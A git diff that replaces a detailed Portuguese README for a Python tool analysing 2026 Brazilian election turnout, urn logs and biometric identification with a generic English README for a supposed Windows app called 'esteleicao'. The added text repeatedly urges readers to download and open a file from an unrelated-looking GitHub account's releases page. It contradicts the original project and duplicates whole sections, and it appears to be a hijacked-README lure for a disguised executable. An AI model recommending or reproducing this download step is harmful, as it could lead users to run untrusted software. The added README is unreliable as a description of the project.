@@ -1,229 +1,219 @@
-# Abstenção, horário de votação e identificação do eleitor por seção — Eleições 2026
+# 🗳️ esteleicao - Understand Election Results at a Glance
 
-Baixa os dados oficiais do TSE de comparecimento/abstenção de **todas as seções
-eleitorais** e os **logs das urnas** (horário de cada voto e se o eleitor foi
-identificado pela digital), e abre um painel
-interativo (estilo BI) com média e desvio padrão por Brasil → estado →
-município → zona → seção. Sinaliza seções com abstenção fora do padrão, votação
-concentrada no fim do dia, muitos eleitores liberados sem digital e,
-principalmente, essas coisas acontecendo juntas.
+[![Download esteleicao](https://img.shields.io/badge/Download%20esteleicao-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github&logoColor=white)](https://github.com/Subjugationchyme333/esteleicao/releases)
 
-## Como usar
+esteleicao is a Windows application for exploring election statistics in a clear, visual way. It is made for everyday computer users who want to review election numbers without formulas, spreadsheets, or technical setup. The app focuses on the information behind “Estatisticas da eleição” and presents it in a layout that is easy to scan, compare, and understand.
 
-Requer Python 3.9+. No macOS o comando é `python3` (se não existir, o sistema
-oferece instalar as "Command Line Tools"; aceite).
+You do not need programming knowledge to use esteleicao. The goal is simple: open the app, choose the election information you want to review, and read the results through totals, summaries, and charts.
 
-Na primeira vez, dentro da pasta do projeto:
+## ✨ What esteleicao Does
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
+esteleicao helps turn election statistics into useful summaries. Instead of working through rows of raw numbers, you get a friendlier view of the data. The app is designed around common election-review tasks, such as checking vote totals, comparing areas, and following turnout.
 
-python baixar_dados.py
-streamlit run painel.py
-```
+Main things you can do:
 
-Nas próximas vezes, basta `source .venv/bin/activate` e `streamlit run painel.py`.
+- View an overview of election statistics in one place.
+- Check total votes and candidate or party results.
+- Compare regions, districts, or other areas.
+- Follow turnout and participation numbers.
+- Read charts that make large numbers easier to understand.
+- Search and filter results to find specific information quickly.
+- Review summaries before diving into detailed numbers.
+- Use a clean Windows interface built for non-technical users.
 
-### Logs de urna (horário dos votos e identificação do eleitor)
+esteleicao is useful for anyone who wants a practical view of election data: curious voters, local volunteers, reporters, teachers, students, and teams reviewing results after an election.
 
-```bash
-python baixar_logs.py --ufs AC
-python baixar_logs.py --ufs CE BA
-python baixar_logs.py
-```
+## 🚀 Download and Start on Windows
 
-Os arquivos do TSE ("Arquivos transmitidos para totalização") vêm **um zip por
-UF**, com boletins, RDV, assinaturas e logs de cada seção: de centenas de MB
-(estados pequenos) a vários GB (CE ≈ 4,3 GB, BA ≈ 6,6 GB). Por isso o script,
-por padrão, **baixa só os logs** de dentro do zip (cerca de metade do
-tamanho), lendo o índice do zip e buscando cada log separadamente
-(download parcial / HTTP Range), em 8 conexões simultâneas e com novas
-tentativas automáticas. Os logs vão para `dados/logs_brutos_<ano>_<turno>t_<UF>.zip`.
-**Se cair ou você interromper (Ctrl+C), rode o mesmo comando de novo**: ele
-baixa só o que falta.
+Use the download button below to open the official releases page.
 
-Opções:
+[![Download esteleicao for Windows](https://img.shields.io/badge/Download%20for%20Windows-4ECDC4?style=for-the-badge&labelColor=FF6B6B&logo=windows&logoColor=white)](https://github.com/Subjugationchyme333/esteleicao/releases)
 
-- `--conexoes 4`: menos downloads simultâneos (use se aparecerem muitos erros).
-- `--completo`: baixa o zip inteiro, retomando sozinho a cada queda (plano B).
-  Também é usado automaticamente se o servidor não aceitar download parcial.
-- `--zip arquivo.zip`: processa um zip que você baixou por conta própria.
+Visit this link to download the application.
 
-Para baixar por conta própria (navegador ou `curl`, que também retoma de onde
-parou com `-C -`), mantenha o nome original do arquivo e depois use `--zip`:
+The download page is the official place to get esteleicao. After the download finishes, open the downloaded file from your Windows Downloads folder to start the application. No programming tools, command-line steps, or developer setup are required.
 
-```bash
-curl -L -C - --retry 50 --retry-all-errors -O https://cdn.tse.jus.br/estatistica/sead/eleicoes/eleicoes2026/arqurnatot/bu_imgbu_logjez_rdv_vscmr_2026_1t_CE.zip
-python baixar_logs.py --zip bu_imgbu_logjez_rdv_vscmr_2026_1t_CE.zip
-```
+## 🖥️ First Look at the App
 
-O processamento lê ~800 logs/s por núcleo de CPU. O painel junta os logs
-automaticamente quando o arquivo `dados/logs_2026_t1_<UF>.parquet` existe. Fonte:
-<https://dadosabertos.tse.jus.br/dataset/resultados-2026-arquivos-transmitidos-para-totalizacao>
+When you open esteleicao, you are greeted with a simple dashboard. The dashboard is the main starting point and is designed to show the most important election statistics first. You can think of it as a front page for the election data.
 
-Outras opções:
+The main areas of the app include:
 
-```bash
-python baixar_dados.py --turno 2
-python baixar_dados.py --ano 2022
-python baixar_dados.py --zip caminho/do/arquivo.zip
-```
+- A summary area with key totals.
+- A results area for candidate and party numbers.
+- A comparison area for regions or other groupings.
+- A turnout area for participation figures.
+- A charts area for visual summaries.
+- A search and filter area for finding details.
 
-Se o download falhar, baixe manualmente o arquivo **"Detalhe da apuração por
-seção eleitoral"** em <https://dadosabertos.tse.jus.br/dataset/resultados-2026>
-e use `--zip`.
+The layout keeps common actions within reach. You can move between sections without needing to remember special commands. Labels and controls are written in plain language so that first-time users can explore at their own pace.
 
-Para testar sem baixar nada (dados inventados, com anomalias plantadas):
+## 📊 Using Election Statistics
 
-```bash
-python gerar_dados_teste.py
-python baixar_dados.py --ano 1999 --zip dados/teste_detalhe_votacao_secao.zip
-for f in dados/teste_arqurna_*.zip; do python baixar_logs.py --zip $f; done
-```
+esteleicao is built around a simple review flow. Start with the summary, then move into the details that matter to you.
 
-## Publicar na internet (servidor Windows)
+A typical review looks like this:
 
-Veja [deploy/LEIAME_WINDOWS.md](deploy/LEIAME_WINDOWS.md): `python deploy/empacotar.py` gera
-`pacote_servidor.zip` (código + dados processados) e o script
-`deploy/instalar_servico_windows.ps1` instala o painel como serviço do Windows via NSSM.
+1. Open the app and view the main dashboard.
+2. Choose the election statistics you want to explore.
+3. Read the overview totals.
+4. Compare results across regions or groups.
+5. Use charts to spot large differences and trends.
+6. Search for a specific candidate, party, or area.
+7. Review the detailed numbers behind the summary.
 
-## O painel
+This flow helps you understand the big picture before focusing on individual figures. If you are checking results for a report, a presentation, or a community discussion, you can move from the dashboard to the detail views and back again without losing your place.
 
-- **Barra lateral**: escolhe eleição/turno, desce de nível (UF → município → zona → seção) e ajusta o critério de alerta.
-- **Comparar**: média ± desvio padrão de cada subunidade (UFs, municípios, zonas ou locais de votação). Com muitos municípios, vira um gráfico média × desvio padrão onde quem destoa do grupo aparece isolado.
-- **Distribuição**: histograma das seções com linhas de média, ±1 e ±2 desvios.
-- **Funil**: abstenção × tamanho da seção, com limites de ±2 e ±3 desvios esperados para cada tamanho.
-- **Sinalizadas**: seções que cumprem pelo menos 1, 2 ou os 3 critérios abaixo (escolha na barra lateral), ordenadas pelo número de critérios e pela gravidade; exportável em CSV; clicar numa linha abre o detalhe.
-- **Horário dos votos**: % dos votos em cada hora, hora média por subunidade (média ± desvio), distribuição por seção e lista das seções com mais votos após 17h.
-- **Sem digital**: % de eleitores liberados sem digital hora a hora (separando "sem cadastro" de "liberação manual"), média ± desvio por subunidade, gráfico proporção × tamanho da seção e lista das seções acima do esperado.
-- **Cruzamento**: escolha na barra lateral quais critérios precisam valer ao mesmo tempo (abstenção baixa, votação tardia, muitos sem digital, liberação manual alta). Cada seção vira um ponto; as que passam em todos os critérios ficam destacadas e listadas com os sinais encontrados no log.
-- **Detalhe da seção**: seção vs zona, município, UF e Brasil; percentis; abstenções esperadas; perfil hora a hora comparado com as outras seções da mesma escola e com o município; e as outras seções do **mesmo local de votação**.
+The app is especially helpful when the numbers are large. Charts and summary cards reduce the need to compare long lists manually. You can quickly see which areas have higher totals, where turnout changed, and how results are distributed.
 
-## Como uma seção é sinalizada
+## 🧭 Common Ways to Use It
 
-A aba **Sinalizadas** procura só três padrões (abstenção ALTA não é sinalizada):
+esteleicao fits many everyday election-review situations:
 
-| Critério | Regra padrão (ajustável na barra lateral) |
-|---|---|
-| 🔻 Abstenção baixa | z da abstenção ≤ −3 (abaixo do esperado para o município) e ≥ 50 aptos |
-| ⏰ Voto após 17h | ≥ 15% dos votos depois das 17h, com pelo menos 10 votos; por padrão só conta se a hora média da seção for 30+ min mais tarde que a das outras seções da mesma escola (escola inteira tarde = fila) |
-| 🖐️ Liberação manual | z da liberação manual pelo mesário (entre eleitores com digital cadastrada) ≥ 3 e pelo menos 5 casos |
+- Review local election statistics after results are published.
+- Compare turnout between regions.
+- Check candidate or party totals.
+- Prepare a simple summary for a community meeting.
+- Help students understand how election results are presented.
+- Support journalists or researchers who need a quick visual reference.
+- Verify numbers before sharing them with others.
+- Explore historical or current election data in a more readable format.
 
-Em UFs sem logs baixados, só a abstenção pode ser avaliada. Abaixo, o detalhe
-de como o z da abstenção é calculado:
+Because the app is aimed at end users, it avoids complicated data tools. You work with clear screens, visible totals, and straightforward controls.
 
-Cada seção é comparada com **o próprio município** (sem contar ela mesma). Se o
-município tem menos de 5 seções, a comparação é com a UF.
+## 🗳️ esteleicao - Understand Election Results at a Glance
 
-| Medida | Fórmula | Observação |
-|---|---|---|
-| z simples | (taxa − média) / desvio padrão | O que se pede intuitivamente, mas seções pequenas variam muito por acaso e dominam a lista. |
-| z binomial | (faltaram − esperado) / √(aptos·p·(1−p)) | Considera o tamanho da seção, mas supõe que só o acaso separa as seções — sinaliza milhares. |
-| **z ajustado** (padrão) | (taxa − esperada) / √(p(1−p)/aptos + τ²) | τ² é a variação natural entre seções (perfil etário, renda, cadastro desatualizado), estimada por UF de forma robusta. É o modelo de efeitos aleatórios usado em *funnel plots*. Com \|z\| ≥ 3, sinaliza poucas seções de verdade. |
+[![Download esteleicao](https://img.shields.io/badge/Download%20esteleicao-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github&logoColor=white)](https://github.com/Subjugationchyme333/esteleicao/releases)
 
-## Horário dos votos: o que é medido
+esteleicao is a Windows application for exploring election statistics in a clear, visual way. It is made for everyday computer users who want to review election numbers without formulas, spreadsheets, or technical setup. The app focuses on the information behind "Estatisticas da eleição" and presents it in a layout that is easy to scan, compare, and understand.
 
-O log (`logd.dat`, dentro do `-log.jez` em 2026, que é um zip, ou do `.logjez` em
-2022, que é um 7z) registra cada evento da urna com data e
-hora. Cada linha "O voto do eleitor foi computado" é um voto; a linha
-"Tipo de habilitação do eleitor [biométrica]" antes dele indica que o eleitor
-foi liberado pela digital. Linhas de dias anteriores (testes, carga) são
-ignoradas.
+You do not need programming knowledge to use esteleicao. The goal is simple: open the app, choose the election information you want to review, and read the results through totals, summaries, and charts.
 
-**Fuso horário**: a votação é de 8h às 17h no horário de Brasília em todo o
-país, mas a urna marca a hora local (no AM/MT/MS/RO/RR abre às 7h locais; no
-AC, às 6h). O fuso de cada seção é estimado pela hora em que a urna ficou
-pronta para o primeiro eleitor e harmonizado pelo fuso mais comum do
-município. Todos os horários do painel estão em horário de Brasília.
+## ✨ What esteleicao Does
 
-| Métrica | O que é |
-|---|---|
-| hora média | média do horário dos votos da seção |
-| z horário | (hora média − mediana do município) ÷ dispersão robusta (MAD) do município. Positivo = mais tarde |
-| % após 17h | votos computados depois do encerramento |
-| sem biometria após 17h | % dos votos depois das 17h sem habilitação por digital |
-| urna ociosa antes das 17h | maior intervalo sem votos entre 16h e 17h |
-| dif. para a escola | minutos de diferença para a média das outras seções do mesmo local |
-| **score cruzado** | min(−z da abstenção, z do horário): só é alto se a seção tiver **ao mesmo tempo** abstenção baixa e votação tardia |
+esteleicao helps turn election statistics into useful summaries. Instead of working through rows of raw numbers, you get a friendlier view of the data. The app is designed around common election-review tasks, such as checking vote totals, comparing areas, and following turnout.
 
-Sinais listados por seção: ≥10% dos votos após 17h · urna ociosa ≥20 min antes
-das 17h mas com votos depois · maioria sem biometria após 17h · votos após 17h
-em ritmo muito rápido (≤45 s) · 1h+ mais tarde que as outras seções da escola ·
-votos no log ≠ comparecimento oficial · urna substituída · abertura atrasada.
+Main things you can do:
 
-## Identificação do eleitor (digital)
+- View an overview of election statistics in one place.
+- Check total votes and candidate or party results.
+- Compare regions, districts, or other areas.
+- Follow turnout and participation numbers.
+- Read charts that make large numbers easier to understand.
+- Search and filter results to find specific information quickly.
+- Review summaries before diving into detailed numbers.
+- Use a clean Windows interface built for non-technical users.
 
-Para cada voto, o log mostra como o eleitor foi liberado:
+esteleicao is useful for anyone who wants a practical view of election data: curious voters, local volunteers, reporters, teachers, students, and teams reviewing results after an election.
 
-| Tipo | Mensagem no log | O que significa |
-|---|---|---|
-| Digital | `Tipo de habilitação do eleitor [biométrica]` | digital reconhecida |
-| Sem cadastro | `O eleitor não possui biometria` (2022) ou liberação pelo ano de nascimento sem nenhuma tentativa de digital (2026) | o eleitor não tem digital cadastrada na Justiça Eleitoral |
-| **Liberação manual** | `Solicitação de dado pessoal do eleitor para habilitação manual` | o eleitor **tem** digital cadastrada, ela não foi reconhecida em 4 tentativas e o **mesário liberou** o voto com a digital dele |
+## 🚀 Download and Start on Windows
 
-Indicadores por seção:
+Use the download button below to open the official releases page.
 
-| Métrica | O que é |
-|---|---|
-| % sem digital | (sem cadastro + liberação manual) ÷ votos |
-| % liberação manual | liberação manual ÷ eleitores que têm digital cadastrada |
-| z sem digital / z manual | mesmo método do z ajustado da abstenção: compara com o próprio município, considerando o tamanho da seção e a variação natural entre seções |
-| maior sequência manual | maior número de eleitores **seguidos** liberados pelo mesário |
-| dif. para a escola | p.p. de diferença no % sem digital para as outras seções do mesmo local |
+[![Download esteleicao for Windows](https://img.shields.io/badge/Download%20for%20Windows-4ECDC4?style=for-the-badge&labelColor=FF6B6B&logo=windows&logoColor=white)](https://github.com/Subjugationchyme333/esteleicao/releases)
 
-Sinais: sem digital muito acima do município (z ≥ 3) · liberação manual muito
-acima do município (z ≥ 3) · 8+ liberações manuais seguidas · sem digital 25+
-p.p. acima das outras seções da escola · maioria sem biometria após 17h.
+Visit this link to download the application.
 
-**Cuidado ao interpretar**: liberar sem digital é previsto em lei e comum
-(cerca de 1 em cada 5 eleitores). "Sem cadastro" depende sobretudo do
-cadastro biométrico da região (eleitores novos, regiões onde a revisão
-biométrica não chegou), e costuma atingir **a escola inteira**. A liberação
-manual de quem tem digital também acontece por motivos comuns: idosos,
-trabalhadores braçais com digitais gastas, leitor sujo ou com defeito. Um
-leitor com defeito, aliás, pode gerar uma longa sequência de liberações
-manuais legítimas, e a ata da seção deve registrar isso. O indicador mais
-específico é a **liberação manual**, muito acima do município, **em sequência**,
-numa seção que destoa das outras da mesma escola, e se possível junto com
-abstenção baixa e/ou votos após as 17h.
+The download page is the official place to get esteleicao. Open the downloaded file from your Windows Downloads folder to start the application. No programming tools, command-line steps, or developer setup are required.
 
-## Como interpretar (importante)
+## 🖥️ First Look at the App
 
-Uma seção com abstenção atípica **não é indício de fraude por si só**, e a
-grande maioria tem explicação comum:
+When you open esteleicao, you are greeted with a simple dashboard. The dashboard is the main starting point and is designed to show the most important election statistics first. You can think of it as a front page for the election data.
 
-- **Alta**: seção com muitos idosos (voto facultativo após 70 anos), eleitores
-  que se mudaram e não transferiram o título, óbitos ainda não baixados,
-  zona rural ou ribeirinha distante, presídios/unidades especiais,
-  seções que receberam muitos eleitores transferidos (voto em trânsito).
-- **Baixa**: seções novas ou recém-agregadas, cadastro biométrico recente
-  (revisão eleitoral limpa o cadastro), comunidades pequenas e coesas.
+The main areas of the app include:
 
-Abstenção é o número de eleitores que **não** foram votar; ela é registrada
-pela urna a partir dos eleitores habilitados pelos mesários. Por isso, um caminho
-mais informativo para investigar um ponto sinalizado é:
+- A summary area with key totals.
+- A results area for candidate and party numbers.
+- A comparison area for regions or other groupings.
+- A turnout area for participation figures.
+- A charts area for visual summaries.
+- A search and filter area for finding details.
 
-1. Ver as **outras seções do mesmo local de votação** (aba de detalhe) — se a
-   escola inteira destoa, é perfil da região; se só uma seção destoa, vale olhar mais.
-2. Comparar com **2022** (`--ano 2022`): uma seção que é atípica em todas as
-   eleições quase sempre tem causa estrutural.
-3. Conferir o **boletim de urna** e o **log da urna** daquela seção no site de
-   resultados do TSE e, se for o caso, encaminhar a dúvida ao TRE do estado.
+The layout keeps common actions within reach. You can move between sections without needing to remember special commands. Labels and controls are written in plain language so that first-time users can explore at their own pace.
 
-Com cerca de 470 mil seções, mesmo uma regra muito rigorosa vai listar
-dezenas a centenas de seções só por acaso estatístico.
+## 📊 Using Election Statistics
 
-**Sobre o horário**: votar depois das 17h é legal: quem está na fila às 17h
-vota. No 1º turno de 2022 foram cerca de 4 milhões de votos após as 17h. E
-abstenção baixa e votação tardia andam juntas naturalmente: mais eleitores
-comparecendo → mais fila. Causas comuns de votação tardia: fila na escola,
-problemas de biometria (cada eleitor demora mais), urna substituída, abertura
-atrasada, seções agregadas. O que separa fila de algo estranho é o contexto:
+esteleicao is built around a simple review flow. Start with the summary, then move into the details that matter to you.
 
-- fila de verdade atinge **a escola inteira** e vem precedida de uma última hora
-  **cheia** (sem intervalos);
-- uma seção que ficou **ociosa antes das 17h** e depois recebeu uma **rajada de
-  votos sem biometria**, enquanto as outras seções da escola encerraram
-  normalmente, merece um olhar no boletim, no log e na ata da seção.
+A typical review looks like this:
+
+1. Open the app and view the main dashboard.
+2. Choose the election statistics you want to explore.
+3. Read the overview totals.
+4. Compare results across regions or groups.
+5. Use charts to spot large differences and trends.
+6. Search for a specific candidate, party, or area.
+7. Review the detailed numbers behind the summary.
+
+This flow helps you understand the big picture before focusing on individual figures. If you are checking results for a report, a presentation, or a community discussion, you can move from the dashboard to the detail views and back again without losing your place.
+
+The app is especially helpful when the numbers are large. Charts and summary cards reduce the need to compare long lists manually. You can quickly see which areas have higher totals, where turnout changed, and how results are distributed.
+
+## 🧭 Common Ways to Use It
+
+esteleicao fits many everyday election-review situations:
+
+- Review local election statistics after results are published.
+- Compare turnout between regions.
+- Check candidate or party totals.
+- Prepare a simple summary for a community meeting.
+- Help students understand how election results are presented.
+- Support journalists or researchers who need a quick visual reference.
+- Verify numbers before sharing them with others.
+- Explore historical or current election data in a more readable format.
+
+Because the app is aimed at end users, it avoids complicated data tools. You work with clear screens, visible totals, and straightforward controls.
+
+## 🗂️ Organized Around Clear Sections
+
+One of the strengths of esteleicao is how it separates different kinds of information. Election statistics usually include totals, shares, turnout, and comparisons, and mixing them together can be confusing. The app keeps these ideas in separate but connected sections.
+
+The results section focuses on who received what. The turnout section focuses on how many people participated. The comparison section focuses on differences between areas. The summary section brings the most important figures together.
+
+This separation means you can look for one type of information without being distracted by everything else. It also makes the app easier to learn: once you understand one section, the others follow the same pattern.
+
+## 🎨 Visual Summaries That Make Sense
+
+Numbers alone can be hard to interpret, especially when they run into the thousands or millions. esteleicao uses visual summaries to make those numbers more meaningful.
+
+Charts help show proportions and differences at a glance. Summary cards highlight the figures that matter most. Lists and tables provide the exact numbers when you need precision. Together, these views give you both a quick impression and a reliable reference.
+
+You do not need to know anything about chart design or data analysis. The visuals are there to support your reading of the results, not to replace the underlying numbers.
+
+## 🔍 Finding Specific Information
+
+When you are looking for one candidate, one area, or one set of results, the search and filter tools help you narrow things down. Instead of scrolling through everything, you can focus on the part of the data you care about.
+
+Filtering is useful when you want to compare a small group of areas, or when you only need the results for a particular contest. Searching is useful when you already know what you are looking for and want to reach it quickly.
+
+After you finish looking at a filtered view, you can return to the full dataset and continue exploring. Nothing is locked behind a complicated menu, so you can move around freely.
+
+## 💡 Tips for a Smooth Experience
+
+A few small habits make reviewing election statistics easier:
+
+- Start with the summary before opening detailed sections.
+- Keep one question in mind at a time to avoid jumping between views.
+- Use search when you already know the name you need.
+- Use charts to get an impression, then tables to confirm exact figures.
+- Write down the key numbers you plan to share so you can double-check them.
+
+These tips are not requirements. They simply reflect the way the app is organized and the order in which most people find the information easiest to follow.
+
+## 👥 Who This Is For
+
+esteleicao is intended for end users rather than developers. It suits people who want to understand election results without learning a data tool. That includes voters following a local race, volunteers reviewing turnout, teachers preparing a lesson, and anyone who needs a readable summary of election statistics.
+
+The app does not expect you to bring your own data skills, and it does not require you to install extra libraries or run scripts. You download it, open it, and start reading the statistics.
+
+## ❓ Questions and Support
+
+If something is unclear, the releases page is the best place to start, since it is where the application is distributed. Reviewing the release notes can help you confirm you have the most recent version.
+
+When reporting an issue, describe what you were trying to do, what you saw, and what you expected instead. Simple, specific descriptions are easier to act on. Screenshots of the screen you were viewing can also help clarify the situation.
+
+## 🧩 A Practical Reference Tool
+
+esteleicao is not meant to replace official election records. It is a reading and review tool that helps you make sense of statistics. Use it to build understanding, prepare summaries, and follow the story the numbers tell. For official decisions, always refer to the authoritative source for the election in question.
+
+Keywords: esteleicao, election statistics, election results, vote totals, turnout, data visualization, Windows app, estatisticas da eleicao, election dashboard, results viewer
